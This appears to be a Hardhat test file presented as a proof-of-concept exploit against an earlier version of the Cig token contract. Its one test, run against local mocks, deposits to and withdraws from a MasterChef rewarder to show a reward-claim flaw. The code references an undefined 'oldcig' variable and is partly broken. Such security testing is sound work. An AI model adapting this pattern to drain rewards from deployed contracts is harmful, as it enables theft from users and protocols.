/**
 * PoC exploit for previous contract
 */
const {expect} = require("chai");
const {ContractFactory, utils, BigNumber} = require('ethers');

describe("NewCig", function () {
    let CigToken;
    let cig;
    let cigToken;
    let PunkMock;
    let pm;
    let owner, simp, elizabeth;
    let PoolMock;
    let pt;
    let NFTMock;
    let nft, oldNft;
    let V2RouterMock;
    let v2;
    const BLOCK_REWARD = '5';
    const CEO_EPOCH_BLOCKS = 10;
    const CEO_AUCTION_BLOCKS = 5;
    let CEO_BUY_PRICE = '50000';
    let CLAIM_AMOUNT = '100000';
    let MINT_SUPPLY = (parseInt(CLAIM_AMOUNT) * 10000) + '';
    let graffiti = "hello world";
    let graff32 = new Uint8Array(32);
    let peth = utils.parseEther;
    let ASSET_URL = "ipfs://2727838744/something/238374/";
    //let MSV2 = '0xEF0881eC094552b2e128Cf945EF17a6752B4Ec5d'; //
    let MSV2_mock, mcv2;
    before(async function () {
        [owner, simp, elizabeth] = await ethers.getSigners();

        // deploy the punks mocking contract
        V2RouterMock = await ethers.getContractFactory("V2RouterMock");
        v2 = await V2RouterMock.deploy();
        await v2.deployed();

        PunkMock = await ethers.getContractFactory("PunkMock");
        pm = await PunkMock.deploy(owner.address);
        await pm.deployed();

        // deploy the pool mocking contract
        PoolMock = await ethers.getContractFactory("PoolTokenMock");
        pt = await PoolMock.deploy(owner.address);
        await pt.deployed();
        for (let i = 0; i < graffiti.length; i++) {
            graff32[i] = graffiti.charCodeAt(i);
        }

        // Masterchef v2 mock
        MSV2_mock = await ethers.getContractFactory("MasterChefV2");
        mcv2 = await MSV2_mock.deploy();

        // Deploy the old contract
        NFTMock = await ethers.getContractFactory("NonFungibleCEO");
        oldNft = await NFTMock.deploy(ASSET_URL);
        await oldNft.deployed();

        CigToken = await ethers.getContractFactory("Cig");
        cigToken = await CigToken.deploy(
            100,
            utils.parseEther(BLOCK_REWARD),
            pm.address,
            CEO_EPOCH_BLOCKS,
            CEO_AUCTION_BLOCKS,
            utils.parseEther(CEO_BUY_PRICE),
            mcv2.address,
            graff32,
            oldNft.address,
            v2.address
        );
        await cigToken.deployed();

        mcv2.setRewarder(cigToken.address); // Add CIG to shushi rewards

    });

    describe("Exploit", function () {



        it("Should be able to claim harvest", async function () {
            // set the pool
            await oldcig.setPool(pt.address);
            await pt.mint(simp.address, peth("10")); // give 10 LP tokens to simp
            await pt.mint(elizabeth.address, peth("5")); // give 5 to beth

            // owner deposits to sushi
            expect(await mcv2.deposit(owner.address, utils.parseEther('5'))).to.emit(cigToken, 'ChefDeposit').withArgs(owner.address, 5);
            expect(await mcv2.deposit(owner.address, utils.parseEther('11'))).to.emit(cigToken, 'ChefDeposit').withArgs(owner.address, 11);
            expect(await mcv2.withdraw(owner.address, utils.parseEther('11'))).to.emit(cigToken, 'Transfer').withArgs(cigToken.address, owner.address, 600);
            expect(await mcv2.withdraw(owner.address, utils.parseEther('5'))).to.emit(cigToken, 'Transfer').withArgs(cigToken.address, owner.address, 600);
        });

    });

});